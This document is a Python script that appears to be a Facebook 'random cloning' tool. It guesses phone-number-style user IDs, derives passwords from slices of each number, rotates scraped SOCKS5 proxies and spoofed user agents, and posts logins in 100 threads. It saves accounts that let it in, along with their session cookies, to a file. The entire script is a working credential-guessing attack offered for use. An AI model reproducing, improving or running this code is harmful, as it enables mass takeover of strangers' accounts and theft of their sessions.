#!/usr/bin/python3
import os,re,sys,random,string,time
from os import system as GHOST
try:
    import requests
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
#_____________[Welcome]_________________#

os.system("clear")
logo =("""\033[1;36m                                              
░   ░░░  ░░        ░░  ░░░░  ░░░      ░░
▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒
▓  ▓  ▓  ▓▓      ▓▓▓▓        ▓▓  ▓▓▓▓  ▓
█  ██    ██  ████████  ████  ██        █
█  ███   ██        ██  ████  ██  ████  █                                                                                                                                                                                                                                  
  """)
os.system('clear')  
os.system('espeak -a 300 " Welcome to, Ghost world,,"')    
os.system('espeak -a 300 " inter Username,,"')        
print(logo)
print("\n\n\t\033[0;92m    ☠️ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 GOJO100K 𝗪𝗢𝗥𝗟𝗗🚫?")
print("   \033[0;96m   🔥  NEHA100K 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦  💯?")
time.sleep(3)
attemps = 0
while attemps < 12345677901:
    username = input('\n\t\033[0;92mEnter Username : ')
    password = input('\t\033[0;93mEnter Password : ')

    if username == 'NEHA' and password == 'NEHA100K':
        print('\n\t\033[0;92mYou Have Successfully Logged in.')
        time.sleep(2)
        os.system('espeak -a 300 " loging successfuly,,"')
        os.system("xdg-open https://www.facebook.com/profile.php?id=100094692406424")
        break
    else:
        print('\n\t\033[0;91mIncorrect Pass Please Trying ')
        time.sleep(2)
        os.system('espeak -a 300 " incorrect password, please contact, tools admin, NEHA vau,,"')
        os.system("xdg-open https://www.facebook.com/profile.php?id=100094692406424")
        os.system('clear')
        attemps += 1
        continue
        
        
logo="""\033[1;36m
░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓████████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                                                                            
\033[37;1m-------------------------------------               
  \033[38;5;96m\033[47m G \x1b[0m\033[37;1m WORKING      FILE CLONE❌
  \033[38;5;96m\033[47m H \x1b[0m\033[37;1m WORKING      RANDOM-01
  \033[38;5;97m\033[47m O \x1b[0m\033[37;1m GITHUB       CYBER-GHOST-ATTACK 
  \033[38;5;98m\033[47m S \x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mPAID\x1b[0m
  \033[38;5;96m\033[47m T \x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m17.9\x1b[0m
\033[1;97m-------------------------------------                                                                                                                                                      
"""
def line():
    print("—"*36)
def sykology():
    NEHA=[]
    GHOST("clear")
    print(logo)
    print(" Example 018/017/019/016/015")
    GHOST_code=input(" Choice [</] >")
    line()
    print(" Example 1000/2000/3000/4000")
    GHOST_lim=int(input(" Choice [</] >"))
    line()
    for z in range(GHOST_lim):
        co=''.join(random.choice(string.digits) for _ in range(8))
        NEHA.append(co)
    print(" [1] Server M      | [4] Server P")
    print(" [2] Server Mbasic | [5] Server X")
    print(" [3] Server Free   | [6] Server Touch")
    line()
    gxd=input(" [%$] Choice:")
    if gxd in ["1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        GHOST("clear")
        print(logo)
        tl=str(len(NEHA))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mNEHA-ok.txt") 
        print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
        line()
        for id in NEHA:
            uid=GHOST_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[GHOST-ATTACK] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            uuu=random.choice(ugen)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[GHOST-ATTACK-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/NEHA-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(3)
sykology()



